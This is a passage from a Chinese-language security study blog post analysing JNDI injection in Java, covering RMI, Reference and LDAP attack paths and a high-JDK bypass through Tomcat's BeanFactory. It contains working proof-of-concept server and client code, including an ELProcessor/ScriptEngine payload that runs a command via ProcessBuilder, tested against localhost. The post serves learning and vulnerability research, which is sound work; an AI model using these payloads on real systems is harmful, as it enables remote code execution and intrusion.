<p>这就是整个JNDI关于RMI的远程调用的过程，回想一下我们整个过程是为了什么？刚开始提到了Reference这个对象，它的构造方法中有工厂的地址和工厂名，又了解到工厂其实是里面有代码执行逻辑，我们的在调用lookup查找的时候会执行工厂的代码逻辑，这很像是一个代码执行的漏洞点，于是我们跟进到 lookup的调用，并一步一步走到这里，期间还调试了一下为啥lookup传进去的不是Reference对象而是ReferenceWrapper_Stub。</p>
<h4 id="JNDI-Reference攻击面总结"><a href="#JNDI-Reference攻击面总结" class="headerlink" title="JNDI Reference攻击面总结"></a>JNDI Reference攻击面总结</h4><p>包含两个，一个是JNDI的调用lookup是RMI原生的lookup方法，这里肯定是有漏洞点的，因为最后调用invoke，里面藏有很深的readObject方法</p>
<p>还有一个就是JNDI特色的 Reference对象的攻击面，它能够定位到工厂位置，然后执行工厂的代码逻辑，存在加载恶意类执行命令的可能性<br>其实JNDI注入它本质上还是逃不开JAVA的两种RCE的点，要么是<strong>加载恶意方法exec</strong>，要么就是<strong>类加载执行代码</strong></p>
<h2 id="JNDI注入之LDAP结合面"><a href="#JNDI注入之LDAP结合面" class="headerlink" title="JNDI注入之LDAP结合面"></a>JNDI注入之LDAP结合面</h2><h3 id="LDAP加载恶意对象演示"><a href="#LDAP加载恶意对象演示" class="headerlink" title="LDAP加载恶意对象演示"></a>LDAP加载恶意对象演示</h3><p>我们上面分析的JNDI漏洞好像跟注入没什么关系，它是一个工厂位置能够给被我们恶意修改之后加载恶意类导致的<br>8u之后的某个版本开始修复这方面的代码，可攻击面锐减至只有一个——LDAP<br>什么是LDAP呢？<br>首先是他的英文全称:<strong>Lightweight Directory Access Protocol</strong><br>中文翻译是<strong>轻型目录访问协议</strong><br>LDAP是之前DAP的升级版，由于之前DAP协议太复杂LDAP就在TCP&#x2F;IP之上定义了一个相对简单的升级和搜索目录的协议<br>我个人理解，感觉就是一个关系型键值对查找协议，他还有一个LDAP目录，对比普通的数据库，都是用来存储信息，例如SQL，它是库-表-列 的包含的结构，而LDAP目录是一种层次结构，它分为如下结构：<br><code>DN DC CN OU </code> 四个部分<br>具体的含义如下</p>
<blockquote>
<p>dn：一条记录的详细位置，由以下几种属性组成<br>dc: 一条记录所属区域（哪一个树，相当于MYSQL的数据库）<br>ou：一条记录所处的分叉（哪一个分支，支持多个ou，代表分支后的分支）<br>cn&#x2F;uid：一条记录的名字&#x2F;ID（树的叶节点的编号，想到与MYSQL的表主键？）</p>
</blockquote>
<p>之后的更具体就不说了，我们自己在本地起一个LDAP服务<br>用的是<code>apache directory studio</code> 这个工具<br>这里有个踩坑记录，就是新版的apache directory studio它的apache directory studio.ini文件内没有指定 JVM的目录，导致无法启动，所以我们稍作修改即可，把我们自己下的JDK的bin目录放进去（JDK版本建议是11，即使是大于11的话之后开启LDAP服务也会报错），这里本身是被注释掉的，我们把注释符去掉，并添加上我们自己的JDK目录<br><img src="https://stoocea.github.io/images/JNDI/12.png" alt="1"></p>
<p>之后在右下角开启服务即可<br><img src="https://stoocea.github.io/images/JNDI/13.png" alt="1"></p>
<p>然后我们自己写一个绑定该LDAP服务的代码逻辑</p>
<p>首先rebind的服务端</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jdk.nashorn.internal.runtime.ECMAException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILDAPServer</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">InitialContext initialContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">Reference refobj=<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;evilref&quot;</span>,<span class="string">&quot;evilref&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);  </span><br><span class="line">initialContext.rebind(<span class="string">&quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;</span>,refobj);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是lookup的客户端</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDILdapClient</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">InitialContext initialContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">initialContext.lookup(<span class="string">&quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>准备好之后，我们启动服务端，先把恶意对象绑上去，然后运行客户端就能加载恶意对象了（加载恶意对象的时候记得一定要找到对应的路径，不然恶意对象加载不到）</p>
<p><img src="https://stoocea.github.io/images/JNDI/14.png" alt="1"></p>
<p>看完效果之后开始分析流程</p>
<h3 id="LDAP加载恶意对象流程"><a href="#LDAP加载恶意对象流程" class="headerlink" title="LDAP加载恶意对象流程"></a>LDAP加载恶意对象流程</h3><p>前半段的流程就不看了，我们跳到接近加载恶意对象前的一段流程中</p>
<p><img src="https://stoocea.github.io/images/JNDI/15.png" alt="1"></p>
<p>几经辗转，调用到了LdapCtx类的c_lookup方法，进行到了一段decodeObject方法，在进入这个方法之前，我们至少需要了解到前面做了哪些工作吧？在此之前已经获取到了LDAP服务中的一些配置信息，dc，cn等<br>然后decodeObject的工作就是根据这些信息来解析这段属性<br><img src="https://stoocea.github.io/images/JNDI/16.png" alt="1"></p>
<p>代码逻辑分为总体的三段，1是判断其是否为seriallize的数据，2是判断其是否为RmiObject的数据，如果都不是则进入3，进行deocdeRerfence的方法<br>显然我们是申请的一个Rerfence的对象服务，所以直接跟进到decodeReference方法<br>decodeReference的内容有很多if，每条if都有其攻击路径，不一一分析（算是埋了个大坑）。当我们decode出来之后，现在已经得到了这个Reference对象，要通过他来根据恶意地址找恶意类了，于是又来到另一个熟悉的Manager（为什么要说又？因为JNDI的Rerfence攻击就是跳出RMI的部分进入到另一个叫做NamingManager而出现的攻击可能性）<br>还是在LdapCtx类的decodeObject方法，现在已经执行完decodeReference了<br><img src="https://stoocea.github.io/images/JNDI/17.png" alt="1"><br>是时候进入DirectoryManager.getObjectInstance了<br>前面省去一段例行检查判断类型，来到实例化的地方<br><img src="https://stoocea.github.io/images/JNDI/18.png" alt="1"></p>
<p>其实代码还是写的很简洁明了的，getObjectFactoryFromReference，从Reference对象中获取到Object工厂<br>我们跟进，发现跟之前的Reference加载工厂查不多，获取codebase，再进行类加载<br><img src="https://stoocea.github.io/images/JNDI/19.png" alt="1"><br>用到的class加载器是URLclassLoader<br>至此呢,JNDI的几个服务对象的攻击面都大致上学习了一遍，稍微做过总结</p>
<h2 id="JNDI攻击面总结"><a href="#JNDI攻击面总结" class="headerlink" title="JNDI攻击面总结"></a>JNDI攻击面总结</h2><h3 id="1-RMI原生"><a href="#1-RMI原生" class="headerlink" title="1.RMI原生"></a>1.RMI原生</h3><p>这个是因为JNDI有些方法，比如说lookup，就是调用的RMI的原生反序列化，之前学习的时候就学到了RMI的lookup最终还是调用了一个很隐蔽的readobject，存在攻击的可能</p>
<h3 id="2-Reference"><a href="#2-Reference" class="headerlink" title="2.Reference"></a>2.Reference</h3><p>Reference提供了一个很抽象的利用点，它可以到指定的地址去加载类，换成安全的说法就是到指定的恶意地址去加载恶意类，从而使恶意类能够执行静态代码块的内容</p>
<h3 id="3-LDAP"><a href="#3-LDAP" class="headerlink" title="3.LDAP"></a>3.LDAP</h3><p>很可惜，上两种攻击方式修复的很早，LDAP虽然修复的也早（8u191，2018），但是还是没它们死的快<br>它的利用原理就是LDAP扩展了Reference攻击，我们把恶意对象通过Reference绑定到LDAP服务上，然后客户端调用lookup的时候（这个时候的RMI原生攻击已经不行了，Reference的NamingManager实例化对象也被限制了）调用到DirectoryManager实例化对象执行代码</p>
<h2 id="JNDI攻击高版本绕过"><a href="#JNDI攻击高版本绕过" class="headerlink" title="JNDI攻击高版本绕过"></a>JNDI攻击高版本绕过</h2><p>在8u191之前都是用LDAP去绕过，而8u191之后就不行了<br>JNDI攻击本身厉害就厉害在限制比较少，因为他是JDK自带的，而且只需要出网就行，但是这种没啥限制的攻击现在能防都防的差不多了，JNDI高版本的攻击存在可能，只是条件要多一点，也就是需要一些存在漏洞的库服务端自带了<br>高版本的LDAP的修复是在哪呢？我们走到DirectoryManager之后，开始通过codebase去加载类，最终还是走到NamingManager加载，之前是直接可以加载了，但是修复之后加了一层判断<br><img src="https://stoocea.github.io/images/JNDI/20.png" alt="1"></p>
<p>也就是图中的<code>if (TRUST_URL_CODE_BASE)</code><br>导致我们加载不到恶意类了<br>稍微回顾一下流程，我们走到Reference都没有问题，只有最后在NamingManager实例化恶意类的时候被限制了，前面加载Reference都是没有问题的，但是最后我们的外部codebase指定的工厂基本上都加载不了类了，只能看看内部有没有可能利用的本地工厂</p>
<h3 id="tomcat的beanfactory工厂"><a href="#tomcat的beanfactory工厂" class="headerlink" title="tomcat的beanfactory工厂"></a>tomcat的beanfactory工厂</h3><p>为什么是tocat呢？Java的web服务大部分都是打的springboot，springboot肯定是有tomcat-embed-core的内容，所以我们优先选择<br>首先得打上tomcat-embed-core的依赖</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat.embed/tomcat-embed-core --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>7.0.47<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>版本的话，组长的评论区说 9.0.2…之后的进行了修复，所以我这边打的就是7.0.47的版本<br>一进类的内容就看见了熟悉的方法<br><img src="https://stoocea.github.io/images/JNDI/21.png" alt="1"></p>
<p>最后NamingManager加载类的时候都会调用factory的getObjectInstance方法，BeanFactory也不例外</p>
<h3 id="Tomcat高版本绕过流程分析"><a href="#Tomcat高版本绕过流程分析" class="headerlink" title="Tomcat高版本绕过流程分析"></a>Tomcat高版本绕过流程分析</h3><p>这部分开始就没有跟着组长的视频走了，因为版本问题和其他问题，我个人在运行到forceString的时候，由于不能直接加载到Runtime类，所以换了一种方式（代码中有体现）师傅们如果也有这类问题，可以试试这种方法</p>
<p>前置条件 已经开启了一个LDAP服务或者RMI的注册中心服务<br>首先是服务端的代码 包含RMI和LDAP的实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIELServer2</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;  </span><br><span class="line">InitialContext initialContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"><span class="comment">//Registry r= LocateRegistry.createRegistry(7788);  </span></span><br><span class="line"><span class="comment">//Reference refObj=new Reference(&quot;evilref&quot;,&quot;evilref&quot;,&quot;http://localhost:7777/&quot;);  </span></span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,  </span><br><span class="line"><span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=eval&quot;</span>));  </span><br><span class="line">  </span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance()&quot;</span> +  </span><br><span class="line"><span class="string">&quot;.getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]&quot;</span> +  </span><br><span class="line"><span class="string">&quot;([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));  </span><br><span class="line"><span class="comment">// ref.add(new StringRefAddr(&quot;a&quot;, &quot;Runtime.getRuntime().exec(&#x27;calc&#x27;)&quot;));  </span></span><br><span class="line"><span class="comment">//initialContext.rebind(&quot;ldap://localhost:10389/cn=evilLdap2,dc=example,dc=com&quot;,ref);  </span></span><br><span class="line">initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteobj&quot;</span>,ref);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>然后是客户端的代码实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIELclient</span> &#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">InitialContext initialContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line"><span class="comment">//initialContext.lookup(&quot;ldap://127.0.0.1:10389/cn=testref,dc=example,dc=com&quot;);  </span></span><br><span class="line">initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteobj&quot;</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对客户端的lookup打下断点，然后启动一下服务端的RMI服务，将恶意对象和Reference对象绑定到注册中心上面，然后客户端，启动！<br>前面相同的调用流程就不写了，我直接打上来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InitialContext#lookup()-&gt;GenericURLContext#lookup()-&gt;RegistryContext#lookup()-&gt;RegistryContext#decodeObject()-&gt;NamingManager#getObjectInstance()-&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先从NamingManager#getObjectInstance()开始<br><img src="https://stoocea.github.io/images/JNDI/22.png" alt="1"><br>当执行到var4.getObjectInstance的时候，此时的var4为BeanFactory<br><img src="https://stoocea.github.io/images/JNDI/23.png" alt="1"><br>于是跟进到BeanFactory#getObjectInstance()<br><img src="https://stoocea.github.io/images/JNDI/24.png" alt="1"><br>经过工厂的名字和地址获取,因为此时已经获取到了需要加载的类 javax.el.ELProcessor的名字，所以下一步就是真正加载他了<br><img src="https://stoocea.github.io/images/JNDI/25.png" alt="1"></p>
<p>继续跟进Constructor类的newInstance（这一步可以不要这么详细），加载完之后跳出，开始加载方法<br><img src="https://stoocea.github.io/images/JNDI/26.png" alt="1"><br>首先获取到forceString参数，然后将方法和参数名以map键值对的形式传入<br><img src="https://stoocea.github.io/images/JNDI/27.png" alt="1"></p>
<p>得到此时ELProcessor要调用的方法eval<br>这里如果是跟着组长的视频调试，调用的代码应该是<br><code>eval(Runtime.getRuntime().exec(&#39;calc&#39;))</code><br>可能访问不到Runtime类，不知道是哪个服务的版本问题<br>所以我们最终调用runtime的时候是ScriptEngineManager类的getEngineByName方法，加载到Javascript的Engine（所有高级语言都存在和系统指令直接交互的能力），然后调用它里面的eval，利用ProcessBuilder类去执行命令或者调用脚本<br>最终在这里实现了恶意方法的反射调用<br><img src="https://stoocea.github.io/images/JNDI/28.png" alt="1"></p>
<h2 id="JNDI注入阶段性总结"><a href="#JNDI注入阶段性总结" class="headerlink" title="JNDI注入阶段性总结"></a>JNDI注入阶段性总结</h2><p>在学高版本绕过之前就已经总结过没有安全处理的攻击方式,那时候其实JNDI有哪些服务，我们就有哪些攻击面 RMI原生 Reference LDAP都是可以打的</p>
<p>RMI原生就不多说，如果我们选择RMI服务，会来到RegistryContext类的lookup(客户端)然后调用回this.registry.lookup方法，因为RMI原生的lookup本来就有readObject方法，存在攻击可能</p>
<p>Reference刚开始低版本是可以任意指定工厂地址，也就是可以任意加载恶意工厂地址内的代码逻辑，不限于执行恶意代码，高版本之后对于工厂地址有了安全性检测，这一点就限制了死了低版本的Reference直接加载恶意类</p>
<p>LDAP是8u191之前一直能够打的一个攻击面，有一段时间是只修了RMI面和Reference面，但是LDAP的攻击面仍然存在，其实他的思路是和前面两种差不多的，都是将恶意的类或者方法放到一个指定的地方让服务器端能够加载到，LDAP就是开启一个服务之后，把恶意类放上去，客户端lookup的时候就能够触发</p>
<p>然后就是高版本，由于LDAP远程加载这条路基本也上行不通了，我们开始找如果它本地自带的一些工厂类存不存在攻击可能<br>结合Springboot内嵌tomcat，然后能够反射调用方法，实例化对象执行静态代码块的条件，我们选定BeanFactory类结合ELProcessor类来反射调用方法</p>
<p>（未完待续，有待补充）</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2023/11/10/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
      title="FastJson反序列化学习"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        FastJson反序列化学习
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2023/10/24/RMI%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/"
      title="RMI的基本攻击方式总结"
     >

    <p class="title-text">
      
        RMI的基本攻击方式总结
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2023 Stoocea<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
